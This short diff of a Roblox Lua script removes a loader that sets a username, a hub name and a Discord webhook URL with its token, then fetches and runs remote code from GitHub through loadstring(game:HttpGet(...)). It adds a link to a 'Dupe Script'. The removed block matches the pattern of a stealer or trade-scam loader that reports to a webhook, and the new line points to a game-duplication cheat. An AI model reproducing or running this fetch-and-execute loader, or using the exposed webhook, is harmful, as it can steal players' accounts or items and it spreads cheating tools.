@@ -1,5 +1,1 @@
-_G.Username = "F1O1A"
-_G.HubName = "Zlylino"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1094576317778898974/4lLfANmGj3WUVnvNJQglNwwxezPrZpyiIYlByWVZB88ZQ7fDa_f_T8iJ-7lPgJKPbeXe"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+https://raw.githubusercontent.com/Foyme/Dupe-Script/main/Dupe%20script
